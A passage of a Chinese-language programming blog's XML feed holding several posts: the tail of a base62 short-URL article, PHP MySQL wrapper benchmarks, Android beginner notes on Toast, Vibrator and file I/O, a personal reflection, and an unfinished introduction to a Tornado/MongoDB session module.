</code></pre><p>从源码上看，找到$string,就找到了加密的key, 然而你要知道这个数据库里有key和value的关系，还是要去遍历所有数据库。</p>
<p>对于长度的计算: </p>
<p>62 x 62 = 3844</p>
<p>62 x 62 x 62 = 238328</p>
<p>62 x 62 x 62 x 62 = 14776336</p>
<p>62 x 62 x 62 x 62 x 62 = 916132832</p>
<p>已经9亿了，基本这么大的数据库，也很慢了。</p>
<p><br></p>
<p>这里有个python的实现: <a href="http://code.activestate.com/recipes/576918-python-short-url-generator/" target="_blank" rel="external">http://code.activestate.com/recipes/576918-python-short-url-generator/</a></p>
<p>国外还有几个服务: </p>
<p><a href="http://bit.ly/" target="_blank" rel="external">http://bit.ly/</a></p>
<p><a href="http://is.gd/" target="_blank" rel="external">http://is.gd/</a></p>
<p><a href="http://tinyurl.com/" target="_blank" rel="external">http://tinyurl.com/</a></p>
<p><br><hr><br></p>
<h1 id="0x03-价值"><a href="#0x03-价值" class="headerlink" title="0x03.价值"></a>0x03.价值</h1><ul>
<li><p>友好型用户体验吧</p>
</li>
<li><p>可以做统计数据</p>
</li>
</ul>
<p>其实，来看一张统计图（ 这个在 <a href="http://homeway.me/2014/09/11/%E5%B0%8F%E8%8D%89%E6%B5%85%E6%B5%85%E8%B0%88web%EF%BC%88%E4%BA%8C%EF%BC%89/">《浅谈web》</a>里面有提到 ）</p>
<p><img src="https://static.blog.homeway.me/blog%2Fxinglai.org2014-09-12.png" alt="网络速度测试"></p>
<p>我们可以看到，dns查询，用了很长一段时间。</p>
<p>对于一些域名，可能查询时间很长，短连接将是一种累赘。</p>
<p><br><hr><br></p>
<h4 id="本文出自-夏日小草-转载请注明出处：-http-homeway-me-2014-09-25-base62-shorter-url-server"><a href="#本文出自-夏日小草-转载请注明出处：-http-homeway-me-2014-09-25-base62-shorter-url-server" class="headerlink" title="本文出自  夏日小草 , 转载请注明出处： http://homeway.me/2014/09/25/base62-shorter-url-server/"></a>本文出自  <a href="http://homeway.me">夏日小草</a> , 转载请注明出处： <a href="http://homeway.me/2014/09/25/base62-shorter-url-server/">http://homeway.me/2014/09/25/base62-shorter-url-server/</a></h4><p><br></p>
<p>-By 小草</p>
<p>2014-09-25 10:35:27</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[php封装一个mysql包]]></title>
      <url>http://homeway.me/2014/09/19/php-package-for-mysql/</url>
      <content type="html"><![CDATA[<p><br></p>
<h4 id="The-artile-is-about-a-php-package-for-mysql-writed-by-myself"><a href="#The-artile-is-about-a-php-package-for-mysql-writed-by-myself" class="headerlink" title="The artile is about a php package for mysql writed by myself."></a>The artile is about a php package for mysql writed by myself.</h4><h5 id="It-likes-codeigniter-but-has-some-other-feature"><a href="#It-likes-codeigniter-but-has-some-other-feature" class="headerlink" title="It likes codeigniter,but has some other feature."></a>It likes <a href="http://codeigniter.org/" target="_blank" rel="external">codeigniter</a>,but has some other feature.</h5><h5 id="And-then-I-test-It-s-speed"><a href="#And-then-I-test-It-s-speed" class="headerlink" title="And then, I test It`s speed."></a>And then, I test It`s speed.</h5><h5 id="Fork-me-here-https-github-com-grasses-JueQuery"><a href="#Fork-me-here-https-github-com-grasses-JueQuery" class="headerlink" title="Fork me here: https://github.com/grasses/JueQuery"></a>Fork me here: <a href="https://github.com/grasses/JueQuery" target="_blank" rel="external">https://github.com/grasses/JueQuery</a></h5><a id="more"></a>
<p><br></p>
<h1 id="0x01-System-Environment"><a href="#0x01-System-Environment" class="headerlink" title="0x01.System Environment"></a>0x01.System Environment</h1><pre><code>- system

MAC os
Software  OS X 10.9.4 (13E28)
Processor  2.4 GHz Intel Core i5
Memory  8 GB 1600 MHz DDR3
250GB SSD

- environment
xampp 1.8.3
Apache/2.4.9
PHP Version 5.5.11
mysqlnd 5.0.11-dev - 20120503 - (mysql is empty)
</code></pre><h1 id="0x02-Test-Insert"><a href="#0x02-Test-Insert" class="headerlink" title="0x02.Test Insert"></a>0x02.Test Insert</h1><h3 id="Code-is-here"><a href="#Code-is-here" class="headerlink" title="Code is here"></a>Code is here</h3><pre><code>$jue = new JueQuery();

for($i=0; $i&lt;100; $i++){

    $insert_data = array(
        &#39;email&#39;=&gt;&#39;xiaocao.grasses@gmail.com&#39;, 
        &#39;username&#39;=&gt;&#39;http://homeway.me/&#39;, 
        &quot;password&quot;=&gt;md5( rand().time() ),
    );

    $insert_test = $jue-&gt;insert_where(&#39;user&#39;, $insert_data );
}
</code></pre><h3 id="First-test-result"><a href="#First-test-result" class="headerlink" title="First test result"></a>First test result</h3><p><img src="http://xiaocao.u.qiniudn.com/blog%2FPHP%20_Module_Mysqlinsert_test_2014-09-19-1.gif" alt="100 Loop And 100 Fetch Test Insert"></p>
<h3 id="Second-test-result"><a href="#Second-test-result" class="headerlink" title="Second test result"></a>Second test result</h3><p><img src="http://xiaocao.u.qiniudn.com/blog%2FPHP%20_Module_Mysqlinsert_test_2014-09-19-2.gif" alt="100 Loop And 100 Fetch Test Insert"></p>
<h3 id="Third-test-result"><a href="#Third-test-result" class="headerlink" title="Third test result"></a>Third test result</h3><p><img src="http://xiaocao.u.qiniudn.com/blog%2FPHP%20_Module_Mysqlinsert_test_2014-09-19-3.gif" alt="100 Loop And 100 Fetch Test Insert"></p>
<p>And then mysql is like this:</p>
<p><img src="http://xiaocao.u.qiniudn.com/blog%2FPHP%20_Module_Mysqlinsert_test_2014-09-19-4.gif" alt="100 Loop And 100 Fetch Test Insert"></p>
<p><br><hr><br></p>
<h1 id="Ox03-Select-a-data-does-not-exist-in-30000-pieces-data"><a href="#Ox03-Select-a-data-does-not-exist-in-30000-pieces-data" class="headerlink" title="Ox03.Select a data does not exist in 30000 pieces data"></a>Ox03.Select a data does not exist in 30000 pieces data</h1><h3 id="Code-is-here-1"><a href="#Code-is-here-1" class="headerlink" title="Code is here"></a>Code is here</h3><pre><code>for($i=0; $i&lt;100; $i++){
    $single = true;
    $where = array(
        &#39;username&#39;=&gt;&#39;http://homeway.me/&#39;, 
        &#39;password&#39;=&gt;&#39;6f27e19bbdd4f290038149344fcc5ffd&#39;,
    );
    $select_test = $jue-&gt;select(&#39;id|username|email&#39;)-&gt;order_by(&#39;id&#39;, &#39;ASC&#39;)-&gt;get_where(&#39;user&#39;, $where,$single);
    $jue-&gt;debug(&#39;Select Test&#39;, $select_test);
}
</code></pre><h3 id="Test-result-is-here"><a href="#Test-result-is-here" class="headerlink" title="Test result is here:"></a>Test result is here:</h3><p><img src="http://xiaocao.u.qiniudn.com/blog%2FPHP%20_Module_Mysql_select_test_2014-09-19-1.gif" alt="100 Loop And 100 Fetch Test Select"></p>
<p><br><hr><br></p>
<h1 id="0x04-Select-a-data-exist-in-30000-pieces-data"><a href="#0x04-Select-a-data-exist-in-30000-pieces-data" class="headerlink" title="0x04.Select a data exist in 30000 pieces data"></a>0x04.Select a data exist in 30000 pieces data</h1><h3 id="Test-result-is-here-1"><a href="#Test-result-is-here-1" class="headerlink" title="Test result is here:"></a>Test result is here:</h3><p><img src="http://xiaocao.u.qiniudn.com/blog%2FPHP%20_Module_Mysql_select_test_2014-09-19-2.gif" alt="100 Loop And 100 Fetch Test Select"></p>
<p><br><hr><br></p>
<h1 id="0x05-Select-a-data-exist-in-30000-pieces-data-using-normal-function-without-class"><a href="#0x05-Select-a-data-exist-in-30000-pieces-data-using-normal-function-without-class" class="headerlink" title="0x05.Select a data exist in 30000 pieces data using normal function without class"></a>0x05.Select a data exist in 30000 pieces data using normal function without class</h1><h3 id="Code-is-here-2"><a href="#Code-is-here-2" class="headerlink" title="Code is here"></a>Code is here</h3><pre><code>for ($i=1; $i &lt; 100 ; $i++) { 
    $select = &quot;SELECT * FROM `user` WHERE `password` = &#39;d29a75d265e91f0de0342443eb2731b5&#39;&quot;;
    $select_result = mysql_query($select);
}
</code></pre><h3 id="Test-result-is-here-2"><a href="#Test-result-is-here-2" class="headerlink" title="Test result is here:"></a>Test result is here:</h3><p><img src="http://xiaocao.u.qiniudn.com/blog%2FPHP%20_Module_Mysql_select_test_2014-09-19-3.gif" alt="100 Loop And 100 Fetch Test Select"></p>
<h5 id="From-result-we-know-that-run-class-and-function-only-using-10-seconds-in-10000-fetch-so-class-is-efficiention"><a href="#From-result-we-know-that-run-class-and-function-only-using-10-seconds-in-10000-fetch-so-class-is-efficiention" class="headerlink" title="From result we know that, run class and function, only using 10 seconds in 10000 fetch, so class is efficiention"></a>From result we know that, run class and function, only using 10 seconds in 10000 fetch, so class is efficiention</h5><p><br><hr><br></p>
<h1 id="0x06-Update-30000-in-30000-pieces-of-data"><a href="#0x06-Update-30000-in-30000-pieces-of-data" class="headerlink" title="0x06.Update 30000 in 30000 pieces of data"></a>0x06.Update 30000 in 30000 pieces of data</h1><h3 id="Code-is-here-3"><a href="#Code-is-here-3" class="headerlink" title="Code is here:"></a>Code is here:</h3><pre><code>for($i=0; $i&lt;100; $i++){
    $where = array(
        &#39;id&#39;=&gt;$i,
    );

    $set = array(
        &#39;username&#39;=&gt;&#39;http://homeway.me/&#39;,
        &#39;email&#39;=&gt;&#39;xiaocao.grasses@gmail.com&#39;,
    );
    $update_test = $jue-&gt;update_where(&#39;user&#39;, $where, $set);
}
</code></pre><h3 id="Test-result-is-here-3"><a href="#Test-result-is-here-3" class="headerlink" title="Test result is here:"></a>Test result is here:</h3><p><img src="http://xiaocao.u.qiniudn.com/blog%2FPHP%20_Module_Mysql_update_test_2014-09-19-1.gif" alt="100 Loop And 100 Fetch Test Update"></p>
<p><br><hr><br></p>
<p>Please indicate the source:<a href="http://homeway.me/2014/09/19/php-package-for-mysql/">http://homeway.me/2014/09/19/php-package-for-mysql/</a></p>
<p><br></p>
<p>-By xiaocao</p>
<p>2014-09-19 19:16:45</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Android基础学习-1]]></title>
      <url>http://homeway.me/2014/09/13/Android-Learning-1/</url>
      <content type="html"><![CDATA[<p><br></p>
<h4 id="本文主要记录Android学习中的几个类，初学基础，学习笔记。"><a href="#本文主要记录Android学习中的几个类，初学基础，学习笔记。" class="headerlink" title="本文主要记录Android学习中的几个类，初学基础，学习笔记。"></a>本文主要记录Android学习中的几个类，初学基础，学习笔记。</h4><h5 id="源码：-https-static-blog-homeway-me-blog-2FAndroid-Learning-Vibrator-Toast-2014-09-14-zip"><a href="#源码：-https-static-blog-homeway-me-blog-2FAndroid-Learning-Vibrator-Toast-2014-09-14-zip" class="headerlink" title="源码： https://static.blog.homeway.me/blog%2FAndroid-Learning-Vibrator-Toast-2014-09-14.zip"></a>源码： <a href="https://static.blog.homeway.me/blog%2FAndroid-Learning-Vibrator-Toast-2014-09-14.zip" target="_blank" rel="external">https://static.blog.homeway.me/blog%2FAndroid-Learning-Vibrator-Toast-2014-09-14.zip</a></h5><p>感觉移动端好玩的东西很多，就去玩玩了。</p>
<p>看过android一阵子了，由于没学过java对android一直比较陌生，刚入门，抄得多写的少。</p>
<a id="more"></a>
<p><br><hr><br></p>
<h1 id="0x01-android-widget-Toast"><a href="#0x01-android-widget-Toast" class="headerlink" title="0x01.android.widget.Toast"></a>0x01.android.widget.Toast</h1><p><br></p>
<p>Toast是一个显示info信息的小工具，不会获取焦点，所以很多时候显示消息很好用，不会影响用户体验。</p>
<p><br></p>
<h5 id="Toast-官网给了两个例子，一个简单调用，一个自定义形式："><a href="#Toast-官网给了两个例子，一个简单调用，一个自定义形式：" class="headerlink" title="Toast 官网给了两个例子，一个简单调用，一个自定义形式："></a>Toast 官网给了两个例子，一个简单调用，一个自定义形式：</h5><pre><code>// Toast 简单调用
Toast.makeText( MainActivity.this, &#39;some msg&#39;, Toast.LENGTH_SHORT).show();
</code></pre><p><br></p>
<pre><code>// Toast 自定义模式 
LayoutInflater inflater = getLayoutInflater();
View layout = inflater.inflate(R.layout.toast, (ViewGroup) findViewById(R.id.toast_layout));

TextView text = (TextView) layout.findViewById(R.id.text);
text.setText(&quot;This is a custom toast&quot;);

Toast toast = new Toast(getApplicationContext());
toast.setGravity(Gravity.CENTER_VERTICAL, 0, 0);
toast.setDuration(Toast.LENGTH_LONG);    
toast.setView(layout);
toast.show();
</code></pre><p><br><hr><br></p>
<h5 id="经过google-Toast有这么几个函数吧"><a href="#经过google-Toast有这么几个函数吧" class="headerlink" title="经过google, Toast有这么几个函数吧:"></a>经过google, Toast有这么几个函数吧:</h5><blockquote>
<p>toast.setGravity(Gravity.RIGHT | Gravity.TOP, 0, 0);</p>
</blockquote>
<pre><code>//设置位置和偏移
Gravity.CENTER 居中
Gravity.LEFT 靠左
Gravity.RIGHT 靠右
Gravity.TOP 靠上
Gravity.BOTTOM 靠下
Gravity.CENTER_HORIZONTAL 横向居中
Gravity.CENTER_VERTICAL 纵向居中
Gravity.FILL 占满
Gravity.FILL_HORIZONTAL 横向占满
Gravity.FILL_VERTICAL 纵向占满
Gravity.NO_GRAVITY 清除所有设置还原默认设置了，貌似就居中了
</code></pre><p><br></p>
<blockquote>
<p>toast.setDuration(Toast.LENGTH_SHORT);</p>
</blockquote>
<pre><code>//设置时间，只能是Toast.LENGTH_LONG和Toast.LENGTH_SHORT两个，长的约4s，短的约2s。
</code></pre><p><br></p>
<blockquote>
<p>toast.setView(layout);</p>
</blockquote>
<p><br></p>
<blockquote>
<p>toast.show();</p>
</blockquote>
<p><br><hr><br></p>
<h5 id="网上摘抄的一个完全自定义Toast-源码"><a href="#网上摘抄的一个完全自定义Toast-源码" class="headerlink" title="网上摘抄的一个完全自定义Toast( 源码 ):"></a>网上摘抄的一个完全自定义Toast( <a href="http://xiaocao.u.qiniudn.com/blog%2FAndroid-Learning-Vibrator-Toast-2014-09-14.zip" target="_blank" rel="external">源码</a> ):</h5><pre><code>protected void myToast(String Title, String Msg){

    //创建一个布局，用于承载Toast中的内容
    LayoutInflater inflater = getLayoutInflater();
    View view = inflater.inflate(R.layout.cell, null);

    //Toast中的内容之一ImageView用于显示图片
    ImageView img = (ImageView) view.findViewById(R.id.ToastImg);
    img.setImageResource( R.drawable.ic_launcher);

    //Toast中的内容之二TextView用于显示Toast的标题
    TextView title = (TextView) view.findViewById(R.id.ToastTitle);
    title.setText( Title );

    //Toast中的内容之三TextView用于显示Toast的信息内容
    TextView text = (TextView) view.findViewById(R.id.ToastMsg);
    text.setText( Msg );

    //创建一个Toast对象
    Toast toast = new Toast(MainActivity.this);

    //设置Toast的显示位置为屏幕的右上方
    toast.setGravity(Gravity.CENTER, 0,0);

    //设置Toast的显示时间
    toast.setDuration(Toast.LENGTH_SHORT);

    //设置Toast显示的布局
    toast.setView(view);

    //显示
    toast.show();

}
</code></pre><p><br></p>
<p>经过亲测，可行，就是这个，显示的时间有点长啊。。</p>
<p><br><hr><br></p>
<h1 id="0x02-android-os-Vibrator"><a href="#0x02-android-os-Vibrator" class="headerlink" title="0x02.android.os.Vibrator"></a>0x02.android.os.Vibrator</h1><p><br></p>
<p>Vibrator是系统震动的一个类。</p>
<p><br></p>
<h5 id="官网只提供了4个api"><a href="#官网只提供了4个api" class="headerlink" title="官网只提供了4个api."></a>官网只提供了4个api.</h5><pre><code>// Turn the vibrator off.
abstract void    cancel()

// Check whether the hardware has a vibrator.
abstract boolean    hasVibrator()

// Vibrate with a given pattern.
abstract void    vibrate(long[] pattern, int repeat)

//Vibrate constantly for the specified period of time.
abstract void    vibrate(long milliseconds)
</code></pre><p>关于介绍也很简单了，网上的例子也是清一色的一个版本，手触摸屏幕，震动2s。</p>
<p>等看过android音频处理后，想去试试随音乐节奏震动的效果。    </p>
<p><br><hr><br></p>
<h5 id="下面是那个网上清一色的例子-源码"><a href="#下面是那个网上清一色的例子-源码" class="headerlink" title="下面是那个网上清一色的例子( 源码 ):"></a>下面是那个网上清一色的例子( <a href="http://xiaocao.u.qiniudn.com/blog%2FAndroid-Learning-Vibrator-Toast-2014-09-14.zip" target="_blank" rel="external">源码</a> ):</h5><p><br></p>
<pre><code>public class MainActivity extends ActionBarActivity {

    Vibrator vibrator;  
    @Override  
    protected void onCreate(Bundle savedInstanceState) {  
        super.onCreate(savedInstanceState);  
        setContentView(R.layout.activity_main);  
        //获取系统的Vibrator服务  
        vibrator=(Vibrator)getSystemService(Service.VIBRATOR_SERVICE);  
    } 

    protected void onStart( Bundle savedInstanceState ) {  
        //super.(savedInstanceState);  
        Toast.makeText(this, &quot;程序开始运行&quot;, Toast.LENGTH_LONG).show();  
    }

    //重写onTouchEvent方法，当用户触碰触摸屏是触发该方法  
    @Override  
    public boolean onTouchEvent(MotionEvent event) {  
        Toast.makeText(this, &quot;触摸屏幕手机震动&quot;, Toast.LENGTH_LONG).show();  

        //震动手机两秒  
        vibrator.vibrate(200);  
        return super.onTouchEvent(event);  
    }
}
</code></pre><p><br><hr><br></p>
<h1 id="0x03-文件读写-FileOutputStream"><a href="#0x03-文件读写-FileOutputStream" class="headerlink" title="0x03.文件读写-FileOutputStream"></a>0x03.文件读写-FileOutputStream</h1><pre><code>/**
 * @author xiaocao
 * 读取刚才用户保存的内容
 */
import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;

private String fileName=&#39;save.txt&#39;;

private void save() {

    String content = &#39;xxx&#39;;
    try {
        /* 根据用户提供的文件名，以及文件的应用模式，打开一个输出流.文件不存系统会为你创建一个的，
         * 至于为什么这个地方还有FileNotFoundException抛出，我也比较纳闷。在Context中是这样定义的
         *   public abstract FileOutputStream openFileOutput(String name, int mode)
         *   throws FileNotFoundException;
         * openFileOutput(String name, int mode);
         * 第一个参数，代表文件名称，注意这里的文件名称不能包括任何的/或者/这种分隔符，只能是文件名
         *          该文件会被保存在/data/data/应用名称/files/save.txt
         * 第二个参数，代表文件的操作模式
         *             MODE_PRIVATE 私有（只能创建它的应用访问） 重复写入时会文件覆盖
         *             MODE_APPEND  私有   重复写入时会在文件的末尾进行追加，而不是覆盖掉原来的文件
         *             MODE_WORLD_READABLE 公用  可读
         *             MODE_WORLD_WRITEABLE 公用 可读写
         *  */

        FileOutputStream outputStream = openFileOutput(fileName,
                Activity.MODE_PRIVATE);
        outputStream.write(content.getBytes());
        outputStream.flush();
        outputStream.close();
        Toast.makeText(MainActivity.this, &quot;保存成功&quot;, Toast.LENGTH_LONG).show();
    } catch (FileNotFoundException e) {
        e.printStackTrace();
    } catch (IOException e) {
        e.printStackTrace();
    }

}

private void read() {
    try {
        FileInputStream inputStream = this.openFileInput(fileName);
        byte[] bytes = new byte[1024];
        ByteArrayOutputStream arrayOutputStream = new ByteArrayOutputStream();
        while (inputStream.read(bytes) != -1) {
            arrayOutputStream.write(bytes, 0, bytes.length);
        }
        inputStream.close();
        arrayOutputStream.close();
        String content = new String(arrayOutputStream.toByteArray());
        showTextView.setText(content);

    } catch (FileNotFoundException e) {
        e.printStackTrace();
    } catch (IOException e) {
        e.printStackTrace();
    }
}
</code></pre><p><br></p>
<p>以上是今天的学习笔记！</p>
<h5 id="本文出自-夏日小草-转载请注明出处：-http-homeway-me-2014-09-13-Android-Learning-1"><a href="#本文出自-夏日小草-转载请注明出处：-http-homeway-me-2014-09-13-Android-Learning-1" class="headerlink" title="本文出自 夏日小草, 转载请注明出处： http://homeway.me/2014/09/13/Android-Learning-1/ "></a>本文出自 <a href="http://homeway.me">夏日小草</a>, 转载请注明出处： <a href="http://homeway.me/2014/09/13/Android-Learning-1/">http://homeway.me/2014/09/13/Android-Learning-1/ </a></h5><p><br><hr><br></p>
<p>-By 小草</p>
<p>2014-09-13 19:33:55</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[写在新学期之前]]></title>
      <url>http://homeway.me/2014/09/04/writed-before-school/</url>
      <content type="html"><![CDATA[<h1 id="0x01-零零碎碎"><a href="#0x01-零零碎碎" class="headerlink" title="0x01.零零碎碎"></a>0x01.零零碎碎</h1><div id="pices"></div>

<p>算是沉淀了大半年吧，没写几篇博客，留下蛮多想说的话。</p>
<p>这半年来，要么在奔波项目答辩，要么在参加一些比赛，留下蛮多遗憾的，没有尽量多学新东西。</p>
<p>这半年，很高兴有阿喵的陪伴。</p>
<p>阿喵是个很开朗的女生，简单、活泼、叽叽喳喳，吵吵闹闹的，不过也蛮好的。</p>
<p>真的是小朋友，整天黏黏的,有阿喵的时光每天都是快乐的。</p>
<a id="more"></a>
<p>还是很高兴得认识了卢杰、隋鑫磊的。</p>
<p>卢杰是个朴实的汉子，天天喜欢搭讪大牛，什么东西都想学，有一股二十岁的奋斗青年的范儿，我就喜欢他这样。</p>
<hr>


<div id="jue"></div>

<h1 id="0x02-在-觉-的日子-http-jue-so"><a href="#0x02-在-觉-的日子-http-jue-so" class="headerlink" title="0x02. 在 { { 觉 } } 的日子 http://jue.so/"></a>0x02. 在 { { 觉 } } 的日子 <a href="http://jue.so" target="_blank" rel="external">http://jue.so/</a></h1><p>迷迷糊糊的，就八月了，和基友说好的，到上海去和他创业。</p>
<p>健哥是在黑客马拉松上偶然结识的一个xxx。(T_T)</p>
<p>一直很喜欢健哥，就是喜欢他那股每天乐呵呵的样子！</p>
<p>其实，来{ { 觉 } }以前，一直有一种畏惧，可能出于人本身的防卫性吧，</p>
<p>拒绝着去上海，要是我做不好怎么办，要是在哪里相处不愉快怎么办，要是出了错误怎办。</p>
<p>也许是观念不同，也许是我不理解吧，刚来上海的时候，总是和团队碰碰撞撞，大概也是出于一种防卫心理吧。</p>
<p>这个时候，健哥出来了，呀，对！我就喜欢健哥这逗比样。</p>
<p>健哥是个见识东西很广的xxx，学会计，了解金融，人缘很好，又喜欢新技术。</p>
<p>之后是小胖妹，一个肉肉的姑娘，哎呀，是有感情的肉。</p>
<p>大概时不时地调戏下小胖妹也是来觉后的一大乐趣。</p>
<p>再之后是灏哥。</p>
<p>善良可爱的灏哥哥光送了送人去医院就送了3次，真可谓是救星啊。</p>
<p>善良可爱的灏哥哥要是再多点东西就好了，别的也不缺，就缺个女人。</p>
<p>还有嘉文啊，迦勒。</p>
<p>迦勒长得还是很帅的，而且做事的感觉又是很稳重的感觉。</p>
<p>至于月月神，那是月神~公司的形象大使啊。（那个，和健哥一起撑伞的照片，我不知道该不该放出来~）</p>
<p>至于现在呢，我是不想回学校了，有一种又要换种生活方式的感觉，也许是人生来喜欢安定，或是我累了吧。</p>
<hr>

<h1 id="0x03-写给22岁的你"><a href="#0x03-写给22岁的你" class="headerlink" title="0x03. 写给22岁的你"></a>0x03. 写给22岁的你</h1><div id="22"></div>

<p>现在想想，22的时候，我在干嘛。</p>
<p>22岁，我还有梦想，我要创业！</p>
<p>源于兴趣也源于目的。</p>
<p>22岁的时候，我可以去想入非非，可以去天马行空。</p>
<p>所以我想努力学新东西，努力尝试。</p>
<p>参加过两三次创业了，都是跟着别人混，但是最后都没实现，或者被踢出去，就散了。</p>
<p>我一直告诉自己，做事要主动，不能被动。</p>
<p>还是那句话，一群人，在一起，玩的开心就好。</p>
<h1 id="0x04-几张暑假的图片"><a href="#0x04-几张暑假的图片" class="headerlink" title="0x04.几张暑假的图片"></a>0x04.几张暑假的图片</h1><p>北京iweb的时光</p>
<p><img src="https://static.blog.homeway.me/blog%2Fbj-iweb.JPG" alt="北京IWEB"></p>
<p><br><hr><br></p>
<p><img src="https://static.blog.homeway.me/blog%2Fbj-iweb2.JPG" alt="北京IWEB"></p>
<p>做饭的快乐时光</p>
<p><img src="https://static.blog.homeway.me/blog%2Fsh-dinner1.JPG" alt="做饭"></p>
<p><br><hr><br></p>
<p><img src="https://static.blog.homeway.me/blog%2Fsh-dinner2.JPG" alt="做饭"></p>
<p><br></p>
<p><hr><br><br></p>
<p>就到这了吧，去睡觉了。</p>
<p><br></p>
<h5 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2014-09-04-writed-before-school"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2014-09-04-writed-before-school" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2014/09/04/writed-before-school/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2014/09/04/writed-before-school/">http://homeway.me/2014/09/04/writed-before-school/</a></h5><p><br></p>
<p>-By小草</p>
<p>2014-09-04 03:36:39</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[tornado下自写一个session模块]]></title>
      <url>http://homeway.me/2014/07/28/mongosion/</url>
      <content type="html"><![CDATA[<p><br><hr><br></p>
<p><a href="https://github.com/grasses/mongosion" target="_blank" rel="external">https://github.com/grasses/mongosion</a></p>
<p>#####An easy session module, writed by python base on pymongo using for tornado.py or web.py!</p>
<p>公司要我写个内部share平台，那就写吧，那就写了。（泪流满面 T_T）</p>
<p>平台基于python.tornado，以mongodb为数据库。</p>
<p>初次接触tornado，感觉比较陌生，T_T, 坑是有的，很多模块没有，session,log等。</p>
<p>那就写呗，那就写了。T_T说多都是泪。</p>
<a id="more"></a>
<h1 id="0x01-Installation"><a href="#0x01-Installation" class="headerlink" title="0x01.Installation"></a>0x01.Installation</h1><p><hr></p>
<p>###use pip</p>
<pre><code>pip install mongosion
</code></pre><p>###or source</p>
<pre><code>wget https://pypi.python.org/packages/source/m/mongosion/mongosion-0.1.3.tar.gz

tar -zxvf mongosion-0.1.3.tar.gz

cd mongosion-0.10/

sudo python setup.py install
</code></pre><p><br></p>
<blockquote>
<p>下面是关于宿主环境安装介绍，已安装的跳过</p>
</blockquote>
<p>开发安装环境 Python 2.7.8，详细兼容性为知…..我只用过python27….</p>
<p>1、先安装tornado(我用的是tornado，用web.py啥的也一样)</p>
<p>pip</p>
<pre><code>pip install
</code></pre><p>or source</p>
<pre><code>wget http://github.com/downloads/facebook/tornado/tornado-2.0.tar.gz

tar xvzf tornado-2.0.tar.gz

cd tornado-2.0

python setup.py build

sudo python setup.py install    
</code></pre><p>2、安装mongodb</p>
<p>给你个教程吧，太多了，题外话了。</p>
<p><a href="http://blog.zhigui.org/2013/09/mac-osx-install-mongodb/" target="_blank" rel="external">mac 下安装mongodb </a></p>
<p><a href="http://www.cnblogs.com/zhoulf/archive/2013/01/31/2887439.html" target="_blank" rel="external">centos 下安装mongodb</a></p>
<p>反正不管用什么手段，安装完，启动。</p>
<p>启动（mac下）：</p>
<pre><code>sudo mongod 
</code></pre><p>3、安装pymong(mongodb在python下地依赖包)   </p>
<p><a href="http://api.mongodb.org/python/current/" target="_blank" rel="external">pymongo 官网</a></p>
<p>直接pip好了</p>
<pre><code>pip install pymongo
</code></pre><p><a href="http://www.cnblogs.com/descusr/archive/2011/11/15/2249391.html" target="_blank" rel="external">插话：关于pymongo搜索有个很好教程。</a></p>
<h1 id="0x02-mongosion"><a href="#0x02-mongosion" class="headerlink" title="0x02.mongosion"></a>0x02.mongosion</h1><p>=========================================</p>
<pre><code>mongosion包含两个类，基类SessionBase和派生类Session,基类主要负责mongodb数据库查询，派生类主要负责数据处理以及逻辑结构。


查找、保存原则：如果有返回数据，如果没有，创新新的session，此时记得更新cookie，模块只负责select, update, insert, delete.


get(),delete(),exist()这3个函数要提供session id


save() 要提供session数据内容(json)，默认数据格式在setting里面设置


expired() 不需要参数
</code></pre><p>setting可以设置：</p>
<ul>
<li><p>过期时间</p>
</li>
<li><p>是否自动删除过期</p>
</li>
<li><p>session内容自定义</p>
</li>
</ul>
<p>####mongosion give you 5 function: </p>
<p><code>get( session_id )</code>  =&gt; get session</p>
<p><code>delete( session_id )</code>  =&gt; remove session</p>
<p><code>save( session_id, {})</code> =&gt; save sesssion</p>
<p><code>exist( session_id )</code> =&gt; check session is existion</p>
<p><code>expired()</code> =&gt; delete expired sessions</p>
<p>####data type </p>
<pre><code>{&#39;_id&#39;:&#39;&#39;, &#39;time&#39;:&#39;&#39;, &#39;session&#39;: {&#39;uid&#39;:&#39;&#39;, &#39;status&#39;:&#39;&#39;, ......} } 
</code></pre><p>#####setting<br>    setting = {</p>
<pre><code>    # mongodb setting
    &#39;host&#39;:&#39;localhost&#39;,
    &#39;port&#39;: 27017,
    &#39;databse&#39;:&#39;mongosion&#39;,

    #session setting
    &#39;session_id&#39;: &#39;&#39;,
    &#39;sessionExpires&#39;: 24*60*60,
    &#39;autoDeleteExpired&#39;: True, # clean expired sessions at every get 
    &#39;secretKey&#39;:base64.b64encode(uuid.uuid4().bytes + uuid.uuid4().bytes),
    &#39;session&#39; : { &#39;uid&#39;:&#39;520&#39;, &#39;status&#39;:&#39;useing&#39;, &#39;isLogin&#39;:False } # default type of data
}
</code></pre><p>####源码查看</p>
<p><a href="https://github.com/grasses/mongosion/blob/master/mongosion/__init__.py" target="_blank" rel="external">https://github.com/grasses/mongosion/blob/master/mongosion/<strong>init</strong>.py</a></p>
<h1 id="0x03-mongosion原理"><a href="#0x03-mongosion原理" class="headerlink" title="0x03.mongosion原理"></a>0x03.mongosion原理</h1><h3 id="how-to-work"><a href="#how-to-work" class="headerlink" title="how to work"></a>how to work</h3><p><img src="http://77l5jp.com1.z0.glb.clouddn.com/image/mongsosionProcessSession.png" alt="process"></p>
<h3 id="mongosion-get-session-id"><a href="#mongosion-get-session-id" class="headerlink" title="mongosion.get(session_id)"></a>mongosion.get(session_id)</h3><p><img src="http://77l5jp.com1.z0.glb.clouddn.com/image/mongsosionGetSession.png" alt="process"></p>
<h3 id="mongosion-save-session-id-‘uid’-’’-‘isLogin’-True"><a href="#mongosion-save-session-id-‘uid’-’’-‘isLogin’-True" class="headerlink" title="mongosion.save(session_id, {‘uid’:’’, ‘isLogin’: True})"></a>mongosion.save(session_id, {‘uid’:’’, ‘isLogin’: True})</h3><p><img src="http://77l5jp.com1.z0.glb.clouddn.com/image/mongsosionSaveSession.png" alt="process"></p>
<h1 id="0x04-Warning"><a href="#0x04-Warning" class="headerlink" title="0x04.Warning"></a>0x04.Warning</h1><hr>


